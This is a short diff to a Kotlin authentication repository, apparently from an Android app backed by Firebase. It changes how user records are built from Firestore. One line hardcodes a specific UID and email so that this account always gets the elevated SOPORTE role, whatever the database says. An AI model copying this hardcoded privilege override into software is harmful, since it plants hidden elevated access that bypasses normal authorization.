@@ -395,7 +395,7 @@ object AuthRepository {
         return try {
             firestore?.collection("users")?.document(uid)?.get()?.await()?.let { doc ->
                 if (doc.exists()) {
-                    val email = doc.getString("email") ?: ""
+                    val email = auth?.currentUser?.takeIf { it.uid == uid }?.email ?: doc.getString("email").orEmpty()
                     val fallbackName = email.substringBefore("@").replaceFirstChar { it.uppercase() }.ifBlank { "Usuario" }
                     User(
                         uid = uid,
@@ -405,7 +405,7 @@ object AuthRepository {
                         dob = doc.getString("dob") ?: "",
                         city = doc.getString("city") ?: "Bogotá",
                         gender = doc.getString("gender") ?: "",
-                        role = doc.getString("role") ?: UserRole.GENERADOR.name,
+                        role = if (uid == "yDGu1WUesuc01uUbUzc3By4qyL02" && email.equals("cookiestech@woodmatch.org", true)) UserRole.SOPORTE.name else doc.getString("role") ?: UserRole.GENERADOR.name,
                         sectorSuba = doc.getString("sectorSuba") ?: "Suba Centro"
                     )
                 } else null
